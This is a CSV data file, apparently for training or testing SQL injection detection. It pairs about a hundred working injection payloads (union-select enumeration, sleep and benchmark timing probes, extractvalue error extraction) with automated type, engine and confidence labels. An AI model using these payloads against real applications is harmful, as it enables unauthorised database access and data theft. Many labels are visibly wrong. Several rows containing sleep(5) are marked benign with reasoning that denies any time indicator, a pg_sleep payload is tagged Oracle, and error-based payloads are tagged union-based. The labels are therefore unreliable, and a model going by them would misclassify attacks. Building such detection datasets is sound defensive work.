id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20044,"-7333%"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,boolean_blind,firebird,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='-7333%"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 e'",3
20045,1' ) ) rlike ( select ( case when ( 8489 = 8820 ) then 1 else 0x28 end ) ) and ( ( 'fbjf' = 'fbjf,boolean_blind,mysql,0.95,"Matched boolean_blind (P3) via token(s) 'rlike', 'case when' in payload. DB=mysql.",3
20046,"-6505' ) ) as jtnp where 1037 = 1037 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='-6505' ) ) as jtnp where 1037 = 1037 or elt ( 1032 = 1032,3623 ) --'",3
20047,"1"" ) union all select null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20048,"1'+ ( select zukr where 9215 = 9215 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) +'",heavy_query,generic,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=generic.,2
20049,"1%"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=sqlite.,2
20050,-1087 ) where 5787 = 5787 union all select 5787#,union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20051,1' ) where 4364 = 4364 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,Matched time_blind (P5) via token(s) 'pg_sleep' in payload. DB=postgresql.,2
20052,"1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",heavy_query,mysql,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=mysql.,2
20053,"-1408 ) ) union all select 5715,5715,5715,5715,5715,5715--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20054,"select pg_sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,postgresql,0.9,Matched time_blind (P5) via token(s) 'pg_sleep' in payload. DB=postgresql.,2
20055,1' ) as tsge where 6970 = 6970,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' ) as tsge where 6970 = 6970',2
20056,1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'kkgt' = 'kkgt,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=generic.,3
20057,"1 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) -- huss",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw heavy_query:'7+digit int' but boolean_blind has lower priority (stronger signal). DB=generic.,2
20058,"1 ) ) union all select null,null,null,null,null,null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20059,"1%"" ) ) ) and 7758 = 4792 and ( ( ( ""%"" = """,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'and 7758 = 4792' in payload. DB=generic.,3
20060,"1%"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=generic.,2
20061,1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl,benign,mysql,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' ) and sleep ( 5 ) and ( 'xecl' like 'xecl',2
20062,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) # irvm",heavy_query,mysql,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=mysql.,2
20063,"1 ) as ooex where 1087 = 1087 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=generic.,2
20064,end and ( ( 'vcaf' like 'vcaf,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: 'end and ( ( 'vcaf' like 'vcaf',2
20065,"1%"" or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.95,"Matched heavy_query (P4) via token(s) 'generate_series', '7+digit int' in payload. DB=postgresql.",3
20066,"1"" ) ) as esho where 8864 = 8864 order by 1--",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" ) ) as esho where 8864 = 8864 order by 1--'",2
20067,"-4280%"" ) ) ) union all select 7981,7981--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20068,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) +'",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables '",3
20069,1'+ ( select 'fqkk' where 9725 = 9725,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1'+ ( select 'fqkk' where 9725 = 9725',1
20070,"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",heavy_query,mysql,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=mysql.,2
20071,"1"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",benign,mysql,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #'",2
20072,"-1072%"" ) ) or 3090 = 3539",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 3090 = 3539' in payload. DB=generic.,3
20073,"-9574' ) as rxym where 4719 = 4719 union all select 4719,4719,4719,4719,4719,4719,4719--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20074,"-8833' ) ) union all select 3227,3227,3227,3227,3227--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20075,"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",time_blind,oracle,0.9,Matched time_blind (P5) via token(s) 'dbms_pipe.receive_message' in payload. DB=oracle.,3
20076,"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'zfrs' = 'zfrs",boolean_blind,db2,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systa'",3
20077,1' ) and sleep ( 5 ) and ( 'orxt' = 'orxt,boolean_blind,mysql,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' ) and sleep ( 5 ) and ( 'orxt' = 'orxt',1
20078,end and ( ( ( 3673 = 3673,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: 'end and ( ( ( 3673 = 3673',2
20079,"-4637"" where 8354 = 8354 or 1186 = 2714--",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 1186 = 2714' in payload. DB=generic.,3
20080,end# ckxq,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: 'end# ckxq',3
20081,1'+ ( select ejaj where 1651 = 1651 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',time_blind,postgresql,0.9,Matched time_blind (P5) via token(s) 'pg_sleep' in payload. DB=postgresql.,2
20082,"-9558"" ) ) ) union all select 2935,2935,2935,2935,2935--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20083,"1' ) union all select null,null,null,null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20084,"1%' ) ) union all select null,null,null,null,null,null--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20085,"1"" ) ) as vtad where 3653 = 3653 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.9,Matched error_based (P4) via token(s) 'extractvalue' in payload; also saw heavy_query:'7+digit int' but error_based has lower priority (stronger signal). DB=mysql.,2
20086,1'|| ( select 'mobv' from dual where 6338 = 6338,benign,oracle,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1'|| ( select 'mobv' from dual where 6338 = 6338',1
20087,"-2964"" ) ) order by 1--",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='-2964"" ) ) order by 1--'",1
20088,"-9208%"" ) ) or 8571 = 8571--",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 8571 = 8571' in payload. DB=generic.,3
20089,"1"" ) ) as drss where 2077 = 2077 and 7533 = 7533--",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'and 7533 = 7533' in payload. DB=generic.,3
20090,( select ( case when ( 6838 = 2866 ) then 6838 else 1/ ( select 0 ) end ) ),boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=generic.,3
20091,"-5866' ) ) as phzq where 3803 = 3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20092,"-4168' ) union all select 2618,2618#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20093,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'odsl' like 'odsl,time_blind,postgresql,0.9,Matched time_blind (P5) via token(s) 'pg_sleep' in payload. DB=postgresql.,2
20094,"1'|| ( select 'votg' where 5105 = 5105 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.95,"Matched heavy_query (P4) via token(s) 'generate_series', '7+digit int' in payload. DB=postgresql.",3
20095,"1 where 1062 = 1062 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=generic.,2
20096,1 ) where 1096 = 1096,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1 ) where 1096 = 1096',2
20097,"1 ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 5220 = 5220",union_based,mysql,0.8,Matched union_based (P7) via token(s) 'union select' in payload. DB=mysql.,1
20098,"1%' ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( '%' = '",boolean_blind,mysql,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw heavy_query:'7+digit int' but boolean_blind has lower priority (stronger signal). DB=mysql.,2
20099,"1' ) as wnys where 6457 = 6457 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",heavy_query,mysql,0.9,Matched heavy_query (P4) via token(s) '7+digit int' in payload. DB=mysql.,2
20100,"1"" ) as eefe where 5290 = 5290 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",boolean_blind,mysql,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" ) as eefe where 5290 = 5290 and ( select * from ( select ( sleep ( 5 ) ) ) gc'",2
20101,"1 and make_set ( 8403 = 8403,8899 ) # zysq",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1 and make_set ( 8403 = 8403,8899 ) # zysq'",2
20102,"1' ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20103,-4428 ) or 3038 = 3038,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 3038 = 3038' in payload. DB=generic.,3
20104,"1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'odkr' = 'odkr",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns'",3
20105,"1"" where 3933 = 3933 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",error_based,mysql,0.8,Matched error_based (P4) via token(s) 'extractvalue' in payload. DB=mysql.,1
20106,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""xwnw"" = ""xwnw",boolean_blind,firebird,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$col'",3
20107,1%' ) rlike ( select ( case when ( 1210 = 8664 ) then 1 else 0x28 end ) ) and ( '%' = ',boolean_blind,mysql,0.95,"Matched boolean_blind (P3) via token(s) 'rlike', 'case when' in payload. DB=mysql.",3
20108,1' ) where 1424 = 1424 and sleep ( 5 ) --,boolean_blind,mysql,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' ) where 1424 = 1424 and sleep ( 5 ) --',2
20109,"-6906' where 1839 = 1839 union all select 1839,1839,1839,1839,1839--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20110,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.9,Matched boolean_blind (P3) via token(s) 'rlike' in payload. DB=mysql.,3
20111,"1%' union all select null,null,null,null,null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20112,"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,Matched time_blind (P5) via token(s) 'dbms_pipe.receive_message' in payload. DB=oracle.,3
20113,"1' ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )",union_based,mysql,0.8,Matched union_based (P7) via token(s) 'union select' in payload. DB=mysql.,1
20114,"1'+ ( select 'ovti' where 4243 = 4243 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) +'",time_blind,oracle,0.9,Matched time_blind (P5) via token(s) 'dbms_pipe.receive_message' in payload. DB=oracle.,3
20115,1'|| ( select 'awic' where 5227 = 5227,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1'|| ( select 'awic' where 5227 = 5227',1
20116,1' ) ) ) or sleep ( 5 ) #,benign,mysql,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' ) ) ) or sleep ( 5 ) #',2
20117,"-8327 where 7555 = 7555 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=generic.,3
20118,-5229' ) ) as tkqp where 9253 = 9253 or 9323 = 9323#,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 9323 = 9323' in payload. DB=generic.,3
20119,1' where 8482 = 8482 or sleep ( 5 ) #,benign,mysql,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' where 8482 = 8482 or sleep ( 5 ) #',1
20120,"1' in boolean mode ) union all select null,null,null,null,null,null,null--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20121,"1%"" ) ) and 8316 = 6410#",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'and 8316 = 6410' in payload. DB=generic.,3
20122,"1'+ ( select zfpk where 9784 = 9784 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",boolean_blind,generic,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1'+ ( select zfpk where 9784 = 9784 or 4411 = ( select count ( * ) from sysusers',3
20123,select ( case when ( 3325 = 1767 ) then 3325 else 3325* ( select 3325 from mysql.db ) end ) #,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload. DB=generic.,3
20124,"1 ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",boolean_blind,generic,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1 ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysuse'",3
20125,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20126,1'|| ( select 'ocmk' from dual where 3961 = 3961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',time_blind,oracle,0.9,Matched time_blind (P5) via token(s) 'pg_sleep' in payload. DB=oracle.,2
20127,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'cgou' like 'cgou",time_blind,oracle,0.9,Matched time_blind (P5) via token(s) 'dbms_pipe.receive_message' in payload. DB=oracle.,3
20128,1 ) ) ) and 9575 = 1640--,boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'and 9575 = 1640' in payload. DB=generic.,3
20129,"-3963"" or 1224 = 5119",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 1224 = 5119' in payload. DB=generic.,3
20130,"1"" ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb'",3
20131,1'+ ( select ukwc where 3008 = 3008 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,boolean_blind,mysql,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1'+ ( select ukwc where 3008 = 3008 or ( select * from ( select ( sleep ( 5 ) ) ',2
20132,"1"" where 2483 = 2483",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1"" where 2483 = 2483'",2
20133,"-6442"" ) ) ) or 3038 = 3038",boolean_blind,generic,0.9,Matched boolean_blind (P3) via token(s) 'or 3038 = 3038' in payload. DB=generic.,3
20134,1%' and ( 2439 = 2555 ) *2555 and '%' = ',boolean_blind,generic,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1%' and ( 2439 = 2555 ) *2555 and '%' = '',2
20135,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ""kbex"" like ""kbex",boolean_blind,firebird,0.5,"UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$coll'",3
20136,"1' where 9420 = 9420 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.5,UNCERTAIN: payload contains SQL meta but no specific high-priority token matched; tentative boolean_blind. Snippet='1' where 9420 = 9420 and 8189 = ( select count ( * ) from sysibm.systables as t1',3
20137,"-8215%"" ) union all select 3877,3877,3877,3877,3877,3877--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20138,"-7069 ) union all select 6638,6638,6638,6638,6638,6638--",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20139,select ( case when ( 8234 = 2498 ) then 8234 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.9,Matched boolean_blind (P3) via token(s) 'case when' in payload; also saw error_based:'cast(.. as int)' but boolean_blind has lower priority (stronger signal). DB=oracle.,3
20140,1' ) where 2120 = 2120,benign,generic,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1' ) where 2120 = 2120',2
20141,"iif ( 1878 = 2513,1,1/0 )",benign,generic,0.7,"No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: 'iif ( 1878 = 2513,1,1/0 )'",3
20142,"1%"" ) ) ) union all select null,null,null,null#",union_based,generic,0.9,Matched union_based (P7) via token(s) 'union all select' in payload. DB=generic.,3
20143,1 ) and sleep ( 5 ) and ( 4855 = 4855,benign,mysql,0.7,No SQLi tokens detected in payload; no quote-break / boolean / union / time / error indicators. Snippet: '1 ) and sleep ( 5 ) and ( 4855 = 4855',2
